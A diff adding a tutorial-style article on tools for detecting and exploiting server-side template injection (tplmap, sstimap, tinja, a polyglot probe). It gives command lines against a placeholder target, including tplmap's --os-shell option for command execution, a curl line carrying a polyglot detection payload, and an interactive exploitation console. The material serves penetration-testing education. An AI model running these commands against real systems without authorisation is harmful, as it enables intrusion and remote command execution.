@@ -1,0 +1,102 @@
+---
+title: SSTI Exploitation Tools for Vulnerability Testing
+description: Explore powerful SSTI tools for automating detection and exploitation
+  in web applications.
+keywords:
+- SSTI tools
+- tplmap
+- sstimap
+- tinja
+- Hackmanit
+- template injection
+- automated vulnerability testing
+- polyglot payload
+- interactive exploitation
+- engine fingerprinting
+---
+
+# Tools
+
+## Context
+
+This article aims to empower offensive security practitioners with the operational use of advanced tooling for detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities. We assume that readers have a foundational understanding of template engines, server-side rendering, and the basic concepts of injection flaws, specifically SSTI.
+
+## Theory
+
+### Purpose and Scope of SSTI Tooling
+
+SSTI tools are specialized utilities designed to automate the process of detecting and exploiting template injection vulnerabilities within web applications. They offer a way to efficiently deliver payloads, identify the specific template engine in use, and assist in developing successful exploits against the detected vulnerabilities. By leveraging known payloads and analyzing web application responses, these tools confirm the presence of SSTI and its potential exploitability.
+
+### Key Features of SSTI Exploitation Tools
+
+SSTI exploitation tools come with a variety of features aimed at simplifying and enhancing the penetration testing process:
+
+- **Engine Fingerprinting:** These tools analyze the response patterns from crafted payloads to accurately identify the template engine used by the target application.
+- **Payload Automation:** They deliver numerous SSTI payloads, providing automated support for detection and potential exploitation.
+- **Interactive Exploitation:** Tools may offer interactive shells or consoles, enabling real-time interaction with a vulnerable template to further customize exploits.
+- **Polyglot Payloads:** SSTI tools often utilize polyglot payloads that work across various template engines, making them versatile in multi-engine environments.
+
+### Tool Selection and Integration Considerations
+
+Choosing the right tool depends on the specific engine targeted, the degree of automation required, and how the tool can integrate with existing security workflows. While some tools focus predominantly on detection, others excel in exploitation and post-exploitation interactions. Integrating these tools with fuzzers, HTTP proxies, or Continuous Integration (CI) pipelines can expand coverage and improve repeatability.
+
+## Practice
+
+### Automated SSTI Detection and Exploitation with tplmap
+
+`tplmap` is an automated tool capable of scanning and exploiting SSTI vulnerabilities. Here's how you can use it:
+
+- Run a scan on a target URL for SSTI vulnerabilities:
+  ```bash
+  tplmap -u 'http://target/app?input=INJECT_HERE'
+  ```
+  This command will employ default payloads to detect any SSTI vulnerabilities.
+
+- If potential vulnerabilities are found, attempt to execute an OS shell:
+  ```bash
+  tplmap -u 'http://target/app?input=INJECT_HERE' --os-shell
+  ```
+  This command will try to open a shell if exploitation is feasible, allowing command execution on the system hosting the template engine.
+
+### Template Engine Fingerprinting with sstimap
+
+The `sstimap` tool allows you to perform engine fingerprinting and basic detection:
+
+- Execute the following to identify the template engine and confirm SSTI vulnerabilities:
+  ```bash
+  sstimap -u 'http://target/app?input=INJECT_HERE'
+  ```
+  This step will help discern the underlying template engine and affirm the presence of SSTI.
+
+### Polyglot Payload Fuzzing with Hackmanit SSTI Polyglot Tool
+
+To manually test for SSTI across multiple engines, consider using a polyglot payload:
+
+- Craft and send the polyglot to the target:
+  ```payload
+  {{7*7}}<%=7*7%>${7*7}#{7*7}
+  ```
+- To send this payload via curl, use:
+  ```bash
+  curl 'http://target/app?input={{7*7}}<%=7*7%>${7*7}#{7*7}'
+  ```
+  Monitor the response to confirm SSTI vulnerabilities based on multiplication results.
+
+### Interactive SSTI Exploitation with tinja
+
+`Tinja` provides an interactive session for exploiting SSTI vulnerabilities:
+
+- Launch an interactive session with:
+  ```bash
+  tinja -u 'http://target/app?input=INJECT_HERE'
+  ```
+  This will open a console allowing you to test and adjust payloads, potentially leading to shell access.
+
+## Tools
+
+- **tplmap**
+- **sstimap**
+- **tinja**
+- **Hackmanit SSTI Polyglot** 
+
+These tools offer powerful capabilities to both detect and exploit SSTI in various web application environments. Using the right strategy and tool can significantly streamline offensive operations targeting SSTI vulnerabilities.
